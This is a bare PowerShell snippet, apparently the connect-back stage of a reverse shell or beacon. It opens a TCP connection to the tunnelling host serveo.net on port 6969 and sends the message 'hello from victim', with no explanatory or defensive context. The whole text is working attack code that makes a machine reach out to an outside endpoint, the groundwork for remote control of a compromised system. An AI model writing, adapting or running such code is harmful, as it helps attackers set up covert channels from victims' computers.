$client = New-Object Net.Sockets.TCPClient("serveo.net", 6969)
$stream = $client.GetStream()
$stream.Write(([text.encoding]::ASCII).GetBytes("hello from victim`n"), 0, 20)
$stream.Flush()
